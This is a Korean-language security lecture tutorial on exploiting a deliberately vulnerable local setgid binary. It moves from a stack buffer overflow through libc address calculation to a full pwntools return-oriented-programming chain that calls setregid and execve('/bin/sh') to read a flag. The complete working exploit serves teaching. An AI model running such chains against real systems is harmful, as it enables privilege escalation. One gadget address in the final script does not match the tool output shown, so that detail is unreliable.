Lec2 Tutorial
==============


## 구동환경 구성

아래의 명령어를 이용하여 파일에 적절한 권한을 부여합시다.

```sh
# add user “lec1”
$

# generate a flag and grant proper privilege
$ echo "This is my flag" > flag
$ chmod 440 flag
$ sudo chown lec2:lec2 flag

# take care of the binary
$ sudo chown lec2:lec2 ex1
$ sudo chmod 2755 ex1
```

위 명령어를 사용하여 `lec2` 사용자만 flag를 읽을 수 있게 하였습니다. `ls` 명령어를 사용하여 파일의 소유자와 privilege를 확인할 수 있습니다.

또한 `cat /etc/passwd` 를 확인할 경우 아래의 정보도 확인 가능합니다.

```sh
...
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
lec1:x:1001:1001::/home/lec1:/bin/sh
lec2:x:1002:1002::/home/lec2:/bin/sh
```

lec2를 확인할 수 있나요? 여기서 처음 column은 user-id, 두번째는 패스워드(x는 암호화 정장되어 있음을 의미), 세번째와 네번째는 각각 UID와 GUID를 나타냅니다. 가장 마지막은 로그인 쉘입니다. 여기서 중요한 것은 GUID가 `1002` 라는 것입니다.


```
$ ls -als

total 52
 4 drwxr-xr-x 2 jjung jjung  4096 Jul 22 06:46 .
 4 drwxr-xr-x 5 jjung jjung  4096 Jul 18 04:20 ..
 4 -rw-r--r-- 1 jjung jjung   231 Jul 18 04:32 Makefile
 4 -rw-r--r-- 1 jjung jjung   641 Jul 18 04:47 TASK.md
 4 -rwxr-sr-x 1 lec2  lec2    18576 Jul 22 11:21 ex1
 4 -rw-r--r-- 1 jjung jjung   747 Jul 18 04:45 ex1.c
 4 -r--r----- 1 lec2  lec2     16 Jul 22 06:46 flag
 4 -rw-r--r-- 1 jjung jjung  1390 Jul 22 06:46 tutorial.md
```

## Exploit 작성해보기

### 달성해야 할 목표

우리는 lec2 그룹 사용자의 권한으로 flag를 읽을 수 있습니다. 그렇게 하기 위해서는 다음의 두 함수가 호출되어야 합니다.

* setregid (1002, 1002)
* execve ("/bin/sh", 0, 0)

이후에는 shell에서 `cat flag` 명령으로 쉽게 flag를 읽을 수 있습니다.


### Simple BOF

본 튜토리얼에는 소스코드가 있습니다. ex1.c를 봅시다

```c
#define _GNU_SOURCE
#include <dlfcn.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <err.h>

void read_input() {
  printf("Password:");

  char buf[32];
  memset(buf, 0, sizeof(buf));
  read(0, buf, 256);

  if (!strcmp(buf, "Password"))
    printf("Password OK :)\n");
  else
    printf("Invalid Password!\n");
}


int main(int argc, char *argv[])
{
  setreuid(geteuid(), geteuid());
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);

  void *self = dlopen(NULL, RTLD_NOW);
  printf("stack   : %p\n", &argc);
  printf("system(): %p\n", dlsym(self, "system"));
  printf("printf(): %p\n", dlsym(self, "printf"));

  read_input();

  return 0;
}
```

아쉽게도 setregid함수나 execve함수가 코드내에서 사용되지는 않았습니다. 그래서 libc 내부에 있는 함수를 호출하는 것을 목표로 하겠습니다. libc로 가기전에 우선 return address를 corruption시켜서 EIP가 의도치 않은 주소로 리턴되도록 해봅시다. 다양한 방법으로 return address를 덮는 payload를 만드는 방법이 있는데, 여기서는 정확한 계산을 하지 않고 개략적인 방법을 써서 payload를 찾도록 하겠습니다. `python` `pwntools`를 이용합니다.

```python
from pwn import *

PAYLOAD = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"

p = process("./ex1")
p.recv()
p.sendline(PAYLOAD)
p.recv()
```

이를 python console에서 실행하면 아래와 같이 보입니다.

```sh
>>> from pwn import *
PAYLOAD = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"

p = process("./ex1")
p.recv()
p.sendline(PAYLOAD)>>>
>>> PAYLOAD = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
>>>
>>> p = process("./ex1")
[x] Starting local process './ex1'
[+] Starting local process './ex1': pid 2180
>>> p.recv()
'stack   : 0xffa02a40\nsystem(): 0xf7d5b790\nprintf(): 0xf7d6a2a0\nPassword:'
>>> p.sendline(PAYLOAD)
>>> p.recv()
[*] Process './ex1' stopped with exit code -11 (SIGSEGV) (pid 2180)
'Invalid Password!\n'
```

유요하지 않은 주소를 참조하였기 때문에 segmentation fault가 발생했습니다. 이제 `dmesg` 명령어를 사용해서 kernel 로그를 확인해봅시다.

``` sh
$ dmesg

...
[  928.654369] ex1[2359]: segfault at 4c4c4c4c ip 000000004c4c4c4c sp 00000000ffa02a00 error 14 in libc-2.31.so[f7d1a000+19000]

````

crash가 발생했을 당시 EIP가 0x4c4c4c4c를 가리키고 있어서 crash가 발생했음을 알려줍니다. 그렇다면 0x4c4c4c4c는 무엇일까요? python에서 확인해보면 `L` 임을 알수 있습니다.

```python

>>> chr(0x4c)
'L'
```

PAYLOAD `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN`에서 `LLLL`  부분만 다른것으로 치환하면 return address를 마음대로 조작해서 control-flow를 hijacking할 수 있겠습니다. 예를들어 `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKAAAA` 를 payload로 활용한다면? return address가 0x41414141로 변경될 겁니다.

```sh
$ dmesg

...
[ 1256.173292] ex1[2571]: segfault at 41414141 ip 0000000041414141 sp 00000000ff8f8a70 error 14 in libc-2.31.so[f7dbc000+19000]
```


### Return 주소가 덮였을때 stack의 상태

스택의 상태는 아래와 같을 겁니다.

```sh
                ---------------------------
        RET     |          LLLL           |
                ---------------------------
        EBP     |          KKKK           |
                ---------------------------
                |          JJJJ           |
                ---------------------------
                |          IIII           |
                ---------------------------
                |          HHHH           |
                ---------------------------
                |          GGGG           |
                ---------------------------
                |           ..            |
                ---------------------------
                |          AAAA           |
                ---------------------------
```

### 이제는 무엇을 해야할까? 어디로 return 할지 주소를 알아야 합니다. 그렇게 하기 위해서는 필요한 함수/문자열의 주소를 주소를 알아야 합니다.

* LIBC base 주소 알기

처음 프로그램을 실행하면 친절하게도 stack 및 system 함수 주소를 알려줍니다. 우리는 libc 내부의 system 함수의 offset을 이용해서 libc base address를 찾을 수 있습니다.

```sh
LIBC_BASE_ADDR = SYSTEM_ADDR - SYSTEM_OFFSET
```

system 함수의 offset은 어떻게 찾을까요? 우리는 본 튜토리얼에서 `readelf`와 `strings`를 이용할 예정입니다.

```sh

# library 확인
$ ldd ex1
        linux-gate.so.1 (0xf7f52000)
        libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xf7f30000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d41000)
        /lib/ld-linux.so.2 (0xf7f54000)

# offset 조회
$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep system
  1537: 00041790    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
```

0x41790이 offset이네요. 만약 현재 실행한 프로세스의 system() 함수의 주소가 0xf7df4790이라면? 0xf7df4790 - 0x41790 = 0xf7db3000이 libc의 베이스 주소가 됩니다. libc base 주소를 중심으로 execve주소 및 `/bin/sh` 문자열의 주소도 계산할 수 있습니다.

```sh
# execve offset
$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep execve
  1633: 000c9500    42 FUNC    WEAK   DEFAULT   15 execve@@GLIBC_2.0

$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep setregid
  298: 000fc480   164 FUNC    WEAK   DEFAULT   15 setregid@@GLIBC_2.0

# /bin/sh offset
$ strings -tx /lib/i386-linux-gnu/libc.so.6 |grep "/bin/sh"
 18e363 /bin/sh
```

그렇다면 우리에게 필요한 주소를 다 계산할 수 있습니다. 참! 여러분이 가지고 있는 libc 버전에 따라 offset이 달라질 수 있음을 주의하세요.

```sh
LIBC_BASE = SYSTEM_ADDR - SYSTEM_OFFSET
EXECVE_ADDR = LIBC_BASE + EXECVE_OFFSET
SETREGID_ADDR = LIBC_BASE + SETREGID_OFFSET
BINSH_ADDR = LIBC_BASE + BINSH_OFFSET
```


### setregid함수 호출

아래와 같이 stack을 구성하면 setregid 함수를 호춣할 수 있습니다. 최초 overwrite된 리턴주소로 인해 `setregid()` 함수가 호출될 것입니다. 이때 HHHH는 `setregid` 함수가 종료된 이후 리턴될 주소를 가리킵니다. (lecture1에서 함수호출시 return 주소를 stack에 push하는 것을 기억하시면 됩니다) 그 윗 부분은 함수호출에서 사용되는 인자값들이 저장됩니다. 현재는 1002, 1002가 인자값으로 들어가겠네요.


```sh

                ---------------------------
        ARG2    |          1002           |
                ---------------------------
        ARG1    |          1002           |
                ---------------------------
 return_setregid|          HHHH
                ---------------------------
        RET(1)  |        setregid()       |
                ---------------------------
        EBP     |          KKKK           |
                ---------------------------
                |          JJJJ           |
                ---------------------------
                |          IIII           |
                ---------------------------
                |          HHHH           |
                ---------------------------
                |          GGGG           |
                ---------------------------
                |           ..            |
                ---------------------------
                |          AAAA           |
                ---------------------------
```


이것을 python payload로 만들어볼까요? `setregid`의 주소를 바로 알수 있습니까? 아직은 아닙니다. 왜냐하면 프로세스에서 알려준 system함수 주소를 parsing하는 routine이 없기 때문입니다. 간단한 python프로그램을 만들어 보면 아래와 같습니다. 필요한 주소도 미리 계산된 offset을 이용하여 계산할 수 있습니다. 그리고 payload를 만들어서 보내봅시다. 참고로 pwntools의 `p32()`는 little endian 형식 4바이트로 packing해주는 함수입니다. 예를들어 `p32(0)`이라고 표시하면 0 대신 0x00000000을 보내줍니다.


```python

from pwn import *

p = process("./ex1")
out = p.recv()

address = {}
for l in out.splitlines():
    if not ":" in l:
        continue
    k, v = l.split(":")
    k = k.replace("()", "").strip()
    v = int(v, 16)
    address[k] = v


SYSTEM_OFFSET   = 0x41790
EXECVE_OFFSET   = 0xc9500
SETREGID_OFFSET = 0xfc480
BINSH_OFFSET    = 0x18e363

LIBC_BASE     = address['system'] - SYSTEM_OFFSET
EXECVE_ADDR   = LIBC_BASE + EXECVE_OFFSET
SETREGID_ADDR = LIBC_BASE + SETREGID_OFFSET
BINSH_ADDR    = LIBC_BASE + BINSH_OFFSET

PAYLOAD = "A" * 44 + p32(SETREGID_ADDR) + "BBBB" + p32(0x0) + p32(0x0)
p.sendline(PAYLOAD)
p.recv()
```

위 payload를 만들었습니다. 어떤일이 발생했나요? 뭔가 segmentation fault가 났지요? 우리가 setregid 함수가 실행된 이후 리턴할 것으로 예상한 "BBBB" (0x42424242)로 리턴을 해서 crash가 발생했다는 것을 알 수 있습니다. 이제 첫번째 함수는 실행했습니다. 다음으로 execve("/bin/sh", 0, 0)이 연달아 실행되도록 할까요?

```sh
$ dmesg

...
[ 3377.482135] ex1[2110]: segfault at 42424242 ip 0000000042424242 sp 00000000ffd461f4 error 14 in libc-2.31.so[f7d0e000+19000]
```

### execve("/bin/sh", 0, 0) 호출


아래의 그림을 봅시다. execve가 실행될때의 return주소와 인자는 뭐가 될까요? 정답은 execve() 바로 위에 있는 1002가 return 주소가 될 것이고, 그 위에 있는 1002가 첫번째 인자값이 되는 것입니다. 그렇다면 여러분이 원하는 인자값을 제공하면서 execve()를 실행할 수 있을까요?

```sh

                ---------------------------
        ARG2    |          1002           |
                ---------------------------
        ARG1    |          1002           |
                ---------------------------
 return_setregid|          execve()       |
                ---------------------------
        RET(1)  |        setregid()       |
                ---------------------------
        EBP     |          KKKK           |
                ---------------------------
                |          JJJJ           |
                ---------------------------
                |          IIII           |
                ---------------------------
                |          HHHH           |
                ---------------------------
                |          GGGG           |
                ---------------------------
                |           ..            |
                ---------------------------
                |          AAAA           |
                ---------------------------
```

아래의 그림과 같이 stack을 만들어 return-oriented programming을 하면 됩니다. 여기서 가장 중요한 POP-POP-RET은 어떤 역할을 하는 것일까요? stack내부에서 필요없는 데이터를 pop시켜서 다음 호출할 함수가 원하는 인자값을 가지고 실행하도록 해주는 역할을 합니다.


```sh
                ---------------------------
        ARG3    |          0              |
                ---------------------------
        ARG2    |          0              |
                ---------------------------
        ARG1    |          "/bin/sh"      |
                ---------------------------
 return_execve  |          ret            |
                ---------------------------
        func    |          execve()       |
                ---------------------------
        ARG2    |          1002           |
                ---------------------------
        ARG1    |          1002           |
                ---------------------------
 return_setregid|         pop-pop-ret     |
                ---------------------------
        RET(1)  |        setregid()       |
                ---------------------------
        EBP     |          KKKK           |
                ---------------------------
                |          JJJJ           |
                ---------------------------
                |          IIII           |
                ---------------------------
                |          HHHH           |
                ---------------------------
                |          GGGG           |
                ---------------------------
                |           ..            |
                ---------------------------
                |          AAAA           |
                ---------------------------
```


pop-pop-return 되는 순간, EIP는 execve() 주소로 바뀔 것이며 이때 stack 모양은 아래와 같습니다. 필요한 인자값이 세팅이 모두 되어 있는 것이지요. 여기가 가장 중요한 포인트인데, 이해가 안되시는 분은 debugger에서 pop, pop, return 되는 순간을 instruction 단위로 따라가면서 stack이 어떻게 바뀌는지 보시기 바랍니다.

```sh
                ---------------------------
        ARG3    |          0              |
                ---------------------------
        ARG2    |          0              |
                ---------------------------
        ARG1    |          "/bin/sh"      |
                ---------------------------
 return_execve  |          ret            |
                ---------------------------
EIP---> func    |          execve()       |
                ---------------------------
```



이를 python 코드로 표현하면 아래와 같습니다. 참! pop-pop-return 주소는 어떻게 찾을까요? ROPgadget이라는 도구를 이용합니다.

```sh
$ ROPgadget --binary ex1 --only "poo|pop|ret"
Gadgets information
============================================================
0x08049483 : pop ebp ; ret
0x08049480 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049022 : pop ebx ; ret
0x08049482 : pop edi ; pop ebp ; ret
0x08049481 : pop esi ; pop edi ; pop ebp ; ret
0x0804900e : ret
0x0804924b : ret 0xe8c1
0x0804906a : ret 0xffff
```

도구를 보니 바이너리의 `0x08049482` 주소가 pop-pop-ret하는 instructions들을 가지고 있군요. 이제 python으로 돌아가서 아래와 같이 payload를 완성합시다.



```python

from pwn import *

p = process("./ex1")
out = p.recv()

address = {}
for l in out.splitlines():
    if not ":" in l:
        continue
    k, v = l.split(":")
    k = k.replace("()", "").strip()
    v = int(v, 16)
    address[k] = v


SYSTEM_OFFSET   = 0x41790
EXECVE_OFFSET   = 0xc9500
SETREGID_OFFSET = 0xfc480
BINSH_OFFSET    = 0x18e363

LIBC_BASE     = address['system'] - SYSTEM_OFFSET
EXECVE_ADDR   = LIBC_BASE + EXECVE_OFFSET
SETREGID_ADDR = LIBC_BASE + SETREGID_OFFSET
BINSH_ADDR    = LIBC_BASE + BINSH_OFFSET

POP_POP_RET   = 0x08049422

PAYLOAD = "A" * 44 + p32(SETREGID_ADDR) + p32(POP_POP_RET) + p32(1002) + \
  p32(1002) + p32(EXECVE_ADDR) + "CCCC" + p32(BINSH_ADDR) + p32(0) + p32(0)
p.sendline(PAYLOAD)
p.recv()

p.interactive()
```

실행을 하다보면 아래와 같이 interactive 모드로 들어가서 shell에서 명령을 입력할 수 있게 됩니다. 여기서 flag를 읽어보면 내용을 확인할 수 있습니다.

```sh
[*] Switching to interactive mode
cat flag
This is my flag
```

축하드립니다. 이제 ROP를 이용해서 flag를 읽어보는 payload를 완성한 것입니다!